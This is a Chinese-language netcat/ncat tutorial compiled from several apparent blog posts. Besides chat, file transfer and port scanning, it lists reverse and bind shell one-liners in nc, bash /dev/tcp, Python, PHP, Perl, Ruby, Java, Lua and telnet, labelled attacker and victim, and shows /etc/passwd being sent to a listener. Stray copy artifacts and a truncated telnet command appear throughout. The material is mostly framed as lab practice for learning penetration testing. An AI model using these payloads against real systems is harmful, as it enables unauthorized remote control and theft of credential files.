# NC

![在这里插入图片描述](https://img-blog.csdnimg.cn/img_convert/05e2d639d902f52fbe8155047aac57bb.png#pic_left)

## 简介

Netcat 简称为nc，中文名网猫，被誉为网络工具中的瑞士军刀。具备以下功能：

- 侦听模式/传输模式
- telnet/获取 banner信息（当作telent工具使用，甚至更好用）
- 传输文本信息（可以作为聊天工具）
- 传输文件/目录
- 加密传输文件
- 远程控制/木马（一般来说，不会被查杀）
- 加密所有流量
- 流媒体服务器
- 远程克隆硬盘（一般用作电子取证）

nc 有很多变种。不同的变种，会在原有 nc 的基础上增加一些新功能。比较流行的变种之一是OpenBSD 社区的变种（也叫“OpenBSD netcat”或“netcat-openbsd”），这是由 OpenBSD 社区重写的 netcat，主要增加了对“IPv6、proxy、Unix sockets”等功能的支持。很多主流 Linux 发行版的官方软件仓库已包含这个变种（比如说：Debian 家族、Arch 家族、openSUSE 家族、Gentoo 家族……）。

在`nc - h`的输出中，如果第一行包含 OpenBSD 这个单词，就说明当前 nc 是 OpenBSD 变种。

**netcat-traditional**
这个是最早的版本，最新版本是2007年1月，版本是1.10，Kali Linux默认带的就是这个版本：
这个版本的nc具有`-e`选项，十分方便反弹shell使用

```
root@kali-linux:~# nc -h
[v1.10-41.1]
12
```

**netcat-openbsd**
ubuntu里默认的nc命令指向的是netcat-openbsd。这个版本因为考虑到安全性等原因没有`-e`选项。所以我们得手动替换一下nc的版本：

```
# 安装传统的netcat
$ sudo apt-get install netcat
# 切换版本
$ sudo update-alternatives --config nc
[sudo] sqlsec 的密码： 
有 2 个候选项可用于替换 nc (提供 /bin/nc)。
  选择       路径               优先级  状态
------------------------------------------------------------
  0            /bin/nc.openbsd       50        自动模式
  1            /bin/nc.openbsd       50        手动模式
* 2            /bin/nc.traditional   10        手动模式
要维持当前值[*]请按<回车键>，或者键入选择的编号：2
123456789101112
```

## 选项

nc的命令是可以合写的，命令行选项的【合写】形式

```bash
nc -l -p 12345 -v
nc -l -p -v 12345
nc -lp 12345 -v
nc -lv -p 12345
nc -lvp 12345
12345
```

所有上面这些命令都是【等价】的。只要注意，-p参数是一个需要带选项值的命令行选项，而-v、-l参数则不需要带选项值。所以端口值一定要写在-p后面
![在这里插入图片描述](https://img-blog.csdnimg.cn/img_convert/0f6377132221c5cdd1b41375e3e2e6bd.png#pic_left)

补充：
使用nc时一般会加上`-n`，因为nc自己去解析域名可能会比较慢，所以自己去通过`ping`或者别的方式获得域名对应的ip之后，再用nc。windows的下载地址http://nmap.org/dist/ncat-portable-5.59BETA1.zip

不同操作系统，或者说不同nc版本之间支持的功能不尽相同，但是总可以通过别的方式曲线救国。

## 案例

这里介绍一些常用的

### telnet/获取 banner信息

![在这里插入图片描述](https://img-blog.csdnimg.cn/img_convert/1959d4e56479013bc787f057e1f8a452.png#pic_center)

### 传输文本信息

#### 聊天

A：nc -l -p 4444
B：nc -nv 1.1.1.1 4444
解释：A使用`-l`参数告诉nc在本地去打开一个端口，监听它，使用`-p`告诉nc打开的端口号。于是，nc在本地打开了一个4444端口等着有人来连接自己，这里A就是类似服务端了。

B去连接某ip的某端口，不做域名解析，显示详细连接过程。这里B类似客户端。
![在这里插入图片描述](https://img-blog.csdnimg.cn/img_convert/8d02f6c4867a9382e0c72f15dc6293f3.gif#pic_center)

#### 信息传递

CentOS把自己的`ls`结果传递到kali上面。
![在这里插入图片描述](https://img-blog.csdnimg.cn/img_convert/2d4af18f351ec04702ae0d11c3def277.png#pic_center)

这里有了一个问题，假如CentOS使用了`ps aux`查看进程，或者使用了nmap出现大量信息，那kali的阅读体验会非常差劲，可以在kali上使用重定向来解决
![在这里插入图片描述](https://img-blog.csdnimg.cn/img_convert/3dae0feddd1d629c4be3b34a0d834ca6.png#pic_center)

再进一步优化，使用`-q`参数，让上面的内容完成传输之后的1秒，大家就断开连接。由于CentOS上的nc不支持`-q`参数，这里让kali作为服务端，Cent作为客户端
![在这里插入图片描述](https://img-blog.csdnimg.cn/img_convert/f7c5948da593918443033fd94eba9833.png#pic_center)

### 传输文件/目录

下面的箭头可能会让人觉得非常混乱，尤其是两种方式对比的时候。如何理解这些左右箭头？我是这样记忆的，作为发送端，是要把文件通过本地监听的端口发送出去，所以发送端的箭头是`<`，那么接收端就是`>`
**传输文件**
接收端 A：nc -lp 333 > 1.mp4
发送端 B：nc -nv 1.1.1.1 333 < 1.mp4 -q 1
![在这里插入图片描述](https://img-blog.csdnimg.cn/img_convert/dd5b91d33c0c4d2e34f2af5374229e85.gif#pic_center)

或者
发送端 A：nc -q 1 -lp 333 < 1.mp4
接收端 B：nc -nv 1.1.1.1 333 > 1.mp4
![在这里插入图片描述](https://img-blog.csdnimg.cn/img_convert/09ecfc6ac6d020720a731674d08f865e.gif#pic_center)

**传输目录**
发送端A：tar -cvf - 文件夹/ | nc -lp 333 -q 1
接收端B：nc -nv 1.1.1.1 333 | tar -xvf -
![在这里插入图片描述](https://img-blog.csdnimg.cn/img_convert/0816b0a81f8713770b9525f2542dee77.gif#pic_center)

### 端口扫描

很多扫描器都能做端口扫描，但是准确性就不一定了。一般来说，nmap的扫描结果较好，nc的仅供参考。
在kali上使用 nc -nvz 192.168.40.133 1-65535去探测Metasploitable的1-65535端口，`-z`参数就是端口探测，默认使用TCP连接，可以通过抓包看到细节。

可以看到，nc的端口扫描是从大到小，一旦能建立起三次握手，就发送FIN+ACK断开连接，然后扫描下一个端口
![在这里插入图片描述](https://img-blog.csdnimg.cn/img_convert/49f748a443a11b6d18194dd6650caf72.png#pic_center)

![在这里插入图片描述](https://img-blog.csdnimg.cn/img_convert/119b3777297ebf39ad2ff54668284d30.png#pic_center)

那么，nc也可以使用UDP的方式做端口扫描，就是加一个`u`，nc -nvzu 192.168.40.133 1-65535
![在这里插入图片描述](https://img-blog.csdnimg.cn/img_convert/808cf97e7e8e1987d5ee30dae2dad033.png#pic_center)

### 控制对方

如果感觉下面的例子有些费神，你就看谁给了bash，谁把bash交出去，谁就是被控制的
（监听端口等着别人连自己的交服务器端，主动连接别人的是客户端）

#### 正向控制

客户端A 【控制端】 ：nc -nv ip 333
服务器端B【被控制端】：nc -lp 333 -c bash
上面的命令挺类似于使用nc聊天的命令，所不同的是服务器端加了一个`-c bash`，命令的意思是一旦有人来连接自己，就把自己的一个bash传给对方，如果是windows的话，把bash换成cmd就行了
![在这里插入图片描述](https://img-blog.csdnimg.cn/img_convert/e6726b3e4240b95bc5383c0a792bb6d2.gif#pic_center)

![在这里插入图片描述](https://img-blog.csdnimg.cn/img_convert/add5440d483bbcb6cfc0d95323959b83.gif#pic_center)

![在这里插入图片描述](https://img-blog.csdnimg.cn/img_convert/5d6187f9af83c7a519f73dbcb1707d20.gif#pic_center)

#### 反向控制

客户端A 【被控制端】：nc –nv 192.168.40.150 333 -c bash
服务器端B【控制端】 ：nc -lp 333
![在这里插入图片描述](https://img-blog.csdnimg.cn/img_convert/ad5d44a49faf7c2e6cc67119926de614.gif#pic_center)

### nc反弹shell

需要目标主机安装了nc

```bash
攻击者：nc -lvp 4566

受害者：nc -e /bin/bash 192.168.239.128 4566
123
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/img_convert/e2f8f9e324615d69dbf8e6ed8b7e8690.png#pic_center)

```bash
攻击者：nc -lvp 4444

受害者：nc -e /bin/sh 192.168.239.128 4444
123
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/img_convert/d37a6087948483679f1a4db6f4e70b5f.png#pic_center)

### 原理

nc -e /bin/bash 192.168.239.128 4566

```bash
-e prog 程序重定向，一旦连接，就执行
1
```

这里的-e后面跟的参数代表的是在创建连接后执行的程序，这里代表在连接到远程后可以在远程执行一个本地shell(/bin/bash)，也就是反弹一个shell给远程，可以看到远程已经成功反弹到了shell，并且可以执行命令。

**其他：**
注意之前使用nc监听端口反弹shell时都会有一个警告：`192.168.239.130: inverse host lookup failed: Unknown host`根据nc帮助文档的提示加上-n参数就可以不产生这个警告了，-n参数代表在建立连接之前不对主机进行dns解析。
![在这里插入图片描述](https://img-blog.csdnimg.cn/img_convert/843c8a4a6ff80812f949034390efdfff.png#pic_center)

------

## 安全性

nc缺乏加密和身份验证的能力。
当我在物理机（类似中间人了）通过抓包可以看到，nc是明文传输的，再者，控制对方的时候没有身份验证，安全性存在隐患
![在这里插入图片描述](https://img-blog.csdnimg.cn/img_convert/d27f54d41e7e25d20ad81c73b76137c4.png#pic_center)

解决办法是可以使用Ncat，Ncat包含于nmap工具包中，实现数据加密传输。
kali和Cent没有这个玩意，这里我手动安装一下

```bash
sudo apt-get install ncat	#kali
yum install nmap-ncat -y	#Cent
12
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/img_convert/faa74e93737ddd9affb2ac39e9f91470.png#pic_center)

客户端 【控制端】：ncat -nv 192.168.40.150 333 --ssl
服务器端【被控制端】：ncat -c bash --allow 192.168.40.146 -vnl 333 --ssl
还是那一套，只不过这里使用了一个加密的管道ssl，然后使用了白名单机制，只允许192.168.40.146来连接我
![在这里插入图片描述](https://img-blog.csdnimg.cn/img_convert/eb410909cf00117676ef47c88bcd2ffe.png#pic_center)

在物理机上（类似中间人）抓包，抓到的是密文
![在这里插入图片描述](https://img-blog.csdnimg.cn/img_convert/f38b56c8c2da039b5db86408e0474594.png#pic_center)

假设这个时候，win7想过来连接Cent，会发现他是连接不上的。
![在这里插入图片描述](https://img-blog.csdnimg.cn/img_convert/ca357d4d03b02b6fd2ab88ac65d45521.png#pic_center)

补充，windows是不需要额外下载的，通过上面的提供的地址http://nmap.org/dist/ncat-portable-5.59BETA1.zip下载nc之后，就能使用ncat，不需要额外下载





nc的安装和简单操作
一．下载nc(这里我用的是[yum](https://so.csdn.net/so/search?q=yum&spm=1001.2101.3001.7020)源的下载)
命令: `yum install -y nc`![在这里插入图片描述](https://img-blog.csdnimg.cn/e217939edbd24dfd954f813b8e70cfd4.png#pic_center)

二．实现连接通信操作
(我这里用的是两台[虚拟机](https://so.csdn.net/so/search?q=虚拟机&spm=1001.2101.3001.7020)相互通信， 分别是contos 7 x86版 和 kali 2022版，这里可以把contos当作靶机,kali当作客户端)

1.查找[kali](https://so.csdn.net/so/search?q=kali&spm=1001.2101.3001.7020)的ip地址
命令：`ifconfig`
![在这里插入图片描述](https://img-blog.csdnimg.cn/ba8d74cb0f884ec18d844502d3ca5dbc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6Lez5qW85qKv5LyB6bmF,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
2.利用nc 打开端口进行[监听](https://so.csdn.net/so/search?q=监听&spm=1001.2101.3001.7020)(这里我打开的是9999端口)
命令：`nc -lnvp 9999`
![在这里插入图片描述](https://img-blog.csdnimg.cn/a3a16f8595a54865a148e94a55b83d06.png#pic_center)
这样就说明已经开始监听了。

3.打开contos 7 连接kali
命令：`nc 192.168.116.xxx 9999`
![在这里插入图片描述](https://img-blog.csdnimg.cn/5b9c82eda576492f89216c564b4691e3.png#pic_center)
输入hello world 后回车 然后我们打开kali，再kali中看到监听的结果
![在这里插入图片描述](https://img-blog.csdnimg.cn/8413492afde14c4a8db0dccfaa03e387.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6Lez5qW85qKv5LyB6bmF,size_17,color_FFFFFF,t_70,g_se,x_16#pic_center)

三．传输文件内容
1.在客户端（kali）建立一个文件1.txt，用户接受通信
命令：`nc -lvp 9999 >1.txt`
![在这里插入图片描述](https://img-blog.csdnimg.cn/a026a39c4bc04563abe43bb12643fbaa.png#pic_center)

2.在服务端（contos 7）传送服务端密码
命令：`nc 192.168.116.xxx 9999 < /etc/passwd`
（如果权限不够，请学习上一篇的漏洞复现，我有讲如何操作）
![在这里插入图片描述](https://img-blog.csdnimg.cn/0c94ab0fde5f4493a041b574558bb752.png#pic_center)
3.观察客户端是否有文件传输进来
命令：`cat 1.txt`
![在这里插入图片描述](https://img-blog.csdnimg.cn/13839775616347e1ab85395dc3dab975.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6Lez5qW85qKv5LyB6bmF,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
那么我们如何确定传输的内容是刚监听到的呢？

4.查看服务端（contos 7中/etc/paaswd文件夹）进行对比。
命令：`cat /etc/passwd`
![在这里插入图片描述](https://img-blog.csdnimg.cn/e79f6222fb65420ba3b3e1eddad1ea33.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6Lez5qW85qKv5LyB6bmF,size_19,color_FFFFFF,t_70,g_se,x_16#pic_center)

小结：通过对比发现，数据是一致的，所以在做渗透测试中，如果你和对方的主机进行了通信，那么你就可以获取文件进行破解，
提升：各位小伙伴可以和我一样开两个虚拟机进行实验，不可以在他人未授权的情况下连接他人主机进行通信。
获取密码也是一样，得到文件后进行哈希破解，在这里就不讲了。

四．获取shell（控制权限）
1.逆向shell
（1）监听端口（kali中输入）
命令：`nc -lvp 9999`
（2）通过contos连接shell
命令：`nc 192.168.116.xxx 9999 -e /bin/bash`
![在这里插入图片描述](https://img-blog.csdnimg.cn/0ff0136479f5427bbaab1a65521c4752.png#pic_center)
（3）Kali中查看是否获得了shell权限
![在这里插入图片描述](https://img-blog.csdnimg.cn/883c245c366b4f279a150f261d304198.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6Lez5qW85qKv5LyB6bmF,size_11,color_FFFFFF,t_70,g_se,x_16#pic_center)

2.正向shell
（1）打开contos的监听
命令：`nc -lvp 6666 -e /bin/bash`
![在这里插入图片描述](https://img-blog.csdnimg.cn/9762b9de64c342e79b400a66191d5aef.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6Lez5qW85qKv5LyB6bmF,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center)
（2）查看contos的ip
命令：`ip -a`
这里很简单就不说了
（3）Kali进行连接
![在这里插入图片描述](https://img-blog.csdnimg.cn/ca53da4f7e564f13bacdbd973b123bb7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6Lez5qW85qKv5LyB6bmF,size_12,color_FFFFFF,t_70,g_se,x_16#pic_center)
在这里我们可以看到连接没有问题，那么其他操作和前面一致.





## nc的几种常用操作以及常见的反弹shell的姿势

### 端口扫描：

```
nc -v ip port  　　　　　指定端口
nc -v -w ip -z 1-65536  指定端口范围
nc -nvz 127.0.0.1 1-100　　nc 使用全链接方式扫描端口（TCP扫描）
nc -nvzu 192.168.1.105 1-1024 udp扫描
```

-v 输出详细报告

-w timeout 一个链接一段时间无操作，则自动断开，默认无超时

-z 只监听不发送任何包

### 文件传输：

```
nc -l 8099 > 要接受的文件名
nc  目的IP 8099 < 要发送的文件
```

### 正向反弹：

靶机：

```
nc -lvp 8099 -e /bin/bash 或者  nc -lvp 8099 -e cmd.exe
```

连接机上输入

```
nc 靶机ip 8099
```

正向反弹是目标机先执行nc命令，然后kali上再进行nc监听，即可反弹shell。

###  反向反弹

**方法1：**

靶机

```
nc 监听地址 监听端口 -e /bin/bash 
nc 监听地址 监听端口 -e cmd.exe
```

监听：

```
nc -Lvp 8099
```

 **方法2：bash**

```
bash -i >& /dev/tcp/127.0.0.1/8099 0>&1
```

监听：

```
nc -Lvp 8099
```

此方法在ubuntu下不会反弹成功，CentOS可以反弹成功。

**方法3 :python**

靶机反弹shell的命令如下：

```
python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('监测的IP',监测的端口));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
```

**方法4：php**

**（\**注意php反弹shell的这些方法都需要php关闭safe_mode这个选项，才可以使用exec函数。\**）**

监听：

```
nc -Lvp 8099
```

靶机

```
php- 'exec("/bin/bash -i >& /dev/tcp/127.0.0.1/8099")' 或者
php -r '$sock=fsockopen("127.0.0.1",8099);exec("/bin/bash -i 0>&3 1>&3 2>&3");'
```

 遇到反弹后不是正常的shell，可用命令：

```
python -c 'import pty;pty.spawn("/bin/bash")'
```

转化为常规的shell。

**方法5：perl**

```
perl -e 'use Socket;$i="127.0.0.1";$p=8099;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

**方法6：ruby**

```
ruby -rsocket -e'f=TCPSocket.open("127.0.0.1",8099).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f)'
```

**方法7：java** 

```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/127.0.0.1/8099;cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[])
p.waitFor()
```

**方法8： lua**

```
lua -e "require('socket');require('os');t=socket.tcp();t:connect('127.0.0.1','8099');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

**方法9：telnet**

```
方法一：攻击者主机上打开两个终端分别执行监听：

nc -lvvp 4444
nc -lvvp 5555


目标主机中执行：

telnet x.x.x.x 4444 | /bin/bash | telnet x.x.x.x 5555



监听两个端口分别用来输入和输出，其中x.x.x.x均为攻击者ip

反弹shell成功后，在监听4444端口的终端中执行命令可以在另一个终端中看到命令执行结果。

方法二：
rm -f /tmp/p; mknod /tmp/p p && telnet x.x.x.x 4444 0/tmp/p
```





# nc安全工具学习记录

# 简介

nc被誉为网络安全界的瑞士军刀，一个简单而有用的[工具](https://ctf.njupt.edu.cn/tag/工具)，透过使用TCP或UDP协议的网络连接去读写数据。

# 版本区别

nc的版本非常乱，有很多版本，他们分别由不同的作者编写。

## netcat-traditional

这个是最早的版本，最新版本是2007年1月，版本是1.10，Kali Linux默认带的就是这个版本：

```bash
root@kali-linux:~# nc -h
[v1.10-41.1]COPY
```

这个版本的nc具有`-e`选项，十分方便反弹shell使用

## netcat-openbsd

ubuntu里默认的nc命令指向的是netcat-openbsd。这个版本因为考虑到安全性等原因没有`-e`选项。所以我们得手动替换一下nc的版本：

```bash
# 安装传统的netcat
$ sudo apt-get install netcat

# 切换版本
$ sudo update-alternatives --config nc
[sudo] sqlsec 的密码： 
有 2 个候选项可用于替换 nc (提供 /bin/nc)。

  选择       路径               优先级  状态
------------------------------------------------------------
  0            /bin/nc.openbsd       50        自动模式
  1            /bin/nc.openbsd       50        手动模式
* 2            /bin/nc.traditional   10        手动模式

要维持当前值[*]请按<回车键>，或者键入选择的编号：2COPY
```

## ncat

这是netcat的比较新的现代版本，它是从头开始编写的，不使用原始的netcat代码。ncat的作者是着名的Nmap程序的作者。ncat几乎重复了原始程序的所有功能，并包含其他功能。CentOS、Red Hat默认带的是ncat。目前ncat已经集成到了nmap里面，安装完nmap后就可以使用`ncat`命令了。

# 用法

本用法全部基于`ncat`命令来做的记录，其他版本的nc可能会有些许差别。

## 实验环境

|   操作系统    |    IP地址    |
| :-----------: | :----------: |
| Ubuntu 18.04  | 10.211.55.14 |
| macOS 10.13.6 | 10.211.55.2  |

## 文字交互

**监听入站连接**

> `-l`：使用监听模式，监控传入的信息

```bash
# sqlsec @ X1cT34m-iMac in ~ 
$ ncat -l 2333COPY
```

此刻macOS就会在监听本地2333端口的入站连接。

**连接远程系统**

尝试实验nc在Ubuntu系统下来连接macOS的2333端口：

```bash
# sqlsec @ ubuntu in ~ 
$ ncat 10.211.55.2 2333COPY
```

现在就可以通过nc来聊天来，任何一方输入的内容都会被另一方看到：
![nc安全工具学习记录-小绿草信息安全实验室](https://dn-coding-net-tweet.codehub.cn/photo/2019/3e76240d-b42d-4b20-a8ef-eb472b74f519.png)
任一方按`Ctrl+C`即可终止这尴尬的聊天。

## 命令交互

### 基本交互

> `-e`：将传入的信息以命令执行

在macOS上运行如下命令，将`/bin/bash`通过2333端口来监听，将收到的信息都发送到`/bin/bash`

```bash
# sqlsec @ X1cT34m-iMac in ~ [22:09:34]
$ ncat -l -e /bin/bash 2333COPY
```

Ubuntu系统这边依然向往常一样来连接macOS的2333端口，只是此时Ubutnu输入的指令都会传入macOS的/bin/bash 执行成功后会返回信息，类似于ssh操作连接来macOS一样：

```bash
# sqlsec @ ubuntu in ~ [22:13:49] C:130
$ ncat 10.211.55.2 2333
whoami
sqlsec
pwd
/Users/sqlsec
id
uid=501(sqlsec) gid=20(staff) groups=20(staff),501(access_bpf),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserver
adm),98(_lpadmin),701(com.apple.sharepoint.group.1),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.a
ccess_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh)
uname -a
Darwin X1cT34m-iMac 17.7.0 Darwin Kernel Version 17.7.0: Wed Apr 24 21:17:24 PDT 2019; root:xnu-4570.71.45~1/RELEASE_X86_64 x86_64COPY
```

### 持久监听

> `-k`: 客户端断掉连接时，服务端依然保持运行
> `-v`：现实指令执行过程细节

在macOS开启一个持久监听的nc

```bash
# sqlsec @ X1cT34m-iMac in ~ 
$ ncat -lvk -e  /bin/bash 2333COPY
```

此时使用Ubuntu去连接macOS:

```bash
# sqlsec @ ubuntu in ~ 
$ ncat 10.211.55.2 2333COPY
```

当Ubuntu客户端使用`CTRL + c`或`CTRL + d`断开连接的时候，macOS的ncat依然在运行，这样方便Ubuntu下次直接nc连进来。
![nc安全工具学习记录-小绿草信息安全实验室](https://dn-coding-net-tweet.codehub.cn/photo/2019/bef45a6a-1473-4377-9ec4-c9c192c40e3f.png)

## 内网弹shell

ncat简单调整是可以穿内网的

|   操作系统    |     IP地址     |
| :-----------: | :------------: |
| macOS 10.13.6 |      内网      |
|    CentOS     | www.sqlsec.com |

首先外网的CentOS服务器先监听本地端口：

> `-w`: 设置等待连线的时间秒数

```bash
# root @ x1ct34m in ~ 
$ ncat -lv 2333        
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Listening on :::2333
Ncat: Listening on 0.0.0.0:2333COPY
```

内网的macOS运行：

```bash
# sqlsec @ X1cT34m-iMac in ~
$ ncat -w 10 -e /bin/bash www.sqlsec.com 2333COPY
```

此时CentOS这边已经接受到了内网到macOS的bash了，可以交互执行masOS的命令：

![nc安全工具学习记录-小绿草信息安全实验室](https://dn-coding-net-tweet.codehub.cn/photo/2019/83d47167-b1f1-405a-87cd-d7d31577c3af.png)

## bash弹shell

如果控制的目标机器自带的`nc`不支持`-e`选项，那如何将shell弹出去呢？这里可以利用自带的`bash`命令交互环境来实现这个操作：

攻击者外网监听：

> `-p` port 本地端口

```bash
# 使用nc命令的话得添加 -p 指定端口这个选项
nc -lvp 2333

# ncat用法不变
ncat -lv 2333COPY
```

被入侵的目标机器执行如下命令：

```bash
bash -i >& /dev/tcp/10.211.55.4/2333 0>&1COPY
```

这条命令的作用等同于之前的`ncat -w 10 -e /bin/bash 10.211.55.4 2333`

| 命令                      | 参数解释                                                     |
| :------------------------ | :----------------------------------------------------------- |
| bash -i                   | 产生一个bash交互环境                                         |
| >&                        | 将联合符号前面的内容与后面结合然后一起重定向给后者           |
| /dev/tcp/10.211.55.4/2333 | 让目标主机与主机10.211.55.4的2333端口简历一个连接            |
| 0>&1                      | 将标准的输入与标准输出内容相结合，然后重定向给前面的标准输出内容 |

## 文件传输

|   操作系统    |     IP地址     |
| :-----------: | :------------: |
| macOS 10.13.6 |      内网      |
|    CentOS     | www.sqlsec.com |

### 上传文件到远程

CentOS远程服务器运行：

```bash
# root @ x1ct34m in ~ 
$ ncat -l 2333 > hello.txtCOPY
```

macOS本地运行：

```bash
# sqlsec @ X1cT34m-iMac in ~
$ ncat www.sqlsec.com 2333 < hello.txtCOPY
```

此时会将macOS的文件传输到远程的CentOS服务器上，传输完成后，两个ncat会话都将终止。

### 从远程下载文件

CentOS远程服务器运行：

```bash
# root @ x1ct34m in ~
$ ncat -l 2333 < hello.txt COPY
```

macOS本地运行：

```bash
# sqlsec @ X1cT34m-iMac in ~
$ ncat www.sqlsec.com 2333 > hello.txtCOPY
```

请注意，这里文件传输完成后不会显示任何内容，并且两个Ncat实例将继续工作。

## 端口扫描

### 范围扫描

ncat不支持端口扫描，但是原始的nc可以扫描端口。

> `-n`: 直接使用ip地址，而不通过域名服务器
> `-z`: 使用0输入/输出模式，只在扫描通信端口时使用

这里扫描10.211.55.14的20-25这个端口范围：

```bash
# sqlsec @ X1cT34m-iMac in ~
$ nc -v -n -z 10.211.55.14 20-25
10.211.55.14 22 (ssh) openCOPY
```

可以发现成功扫描出22端口是开放的了

### 单个扫描

```bash
# sqlsec @ X1cT34m-iMac in ~
$ nc -v -z -n 10.211.55.14 22 
10.211.55.14 22 (ssh) openCOPY
```

nc的命令可以写在一起的，下面两条命令的作用相同：

```bash
$ nc -v -z -n 10.211.55.14 22 
$ nc -vzn 10.211.55.14 22COPY
```

## 详细参数

```plain
Options taking a time assume seconds. Append 'ms' for milliseconds,
's' for seconds, 'm' for minutes, or 'h' for hours (e.g. 500ms).
  -4                         Use IPv4 only
  -6                         Use IPv6 only
  -U, --unixsock             Use Unix domain sockets only
  -C, --crlf                 Use CRLF for EOL sequence
  -c, --sh-exec <command>    Executes the given command via /bin/sh
  -e, --exec <command>       Executes the given command
      --lua-exec <filename>  Executes the given Lua script
  -g hop1[,hop2,...]         Loose source routing hop points (8 max)
  -G <n>                     Loose source routing hop pointer (4, 8, 12, ...)
  -m, --max-conns <n>        Maximum <n> simultaneous connections
  -h, --help                 Display this help screen
  -d, --delay <time>         Wait between read/writes
  -o, --output <filename>    Dump session data to a file
  -x, --hex-dump <filename>  Dump session data as hex to a file
  -i, --idle-timeout <time>  Idle read/write timeout
  -p, --source-port port     Specify source port to use
  -s, --source addr          Specify source address to use (doesn't affect -l)
  -l, --listen               Bind and listen for incoming connections
  -k, --keep-open            Accept multiple connections in listen mode
  -n, --nodns                Do not resolve hostnames via DNS
  -t, --telnet               Answer Telnet negotiations
  -u, --udp                  Use UDP instead of default TCP
      --sctp                 Use SCTP instead of default TCP
  -v, --verbose              Set verbosity level (can be used several times)
  -w, --wait <time>          Connect timeout
  -z                         Zero-I/O mode, report connection status only
      --append-output        Append rather than clobber specified output files
      --send-only            Only send data, ignoring received; quit on EOF
      --recv-only            Only receive data, never send anything
      --allow                Allow only given hosts to connect to Ncat
      --allowfile            A file of hosts allowed to connect to Ncat
      --deny                 Deny given hosts from connecting to Ncat
      --denyfile             A file of hosts denied from connecting to Ncat
      --broker               Enable Ncat's connection brokering mode
      --chat                 Start a simple Ncat chat server
      --proxy <addr[:port]>  Specify address of host to proxy through
      --proxy-type <type>    Specify proxy type ("http" or "socks4" or "socks5")
      --proxy-auth <auth>    Authenticate with HTTP or SOCKS proxy server
      --ssl                  Connect or listen with SSL
      --ssl-cert             Specify SSL certificate file (PEM) for listening
      --ssl-key              Specify SSL private key (PEM) for listening
      --ssl-verify           Verify trust and domain name of certificates
      --ssl-trustfile        PEM file containing trusted SSL certificates
      --ssl-ciphers          Cipherlist containing SSL ciphers to use
      --ssl-alpn             ALPN protocol list to use.
      --version              Display Ncat's version information and exit

See the ncat(1) manpage for full options, descriptions and usage examples
```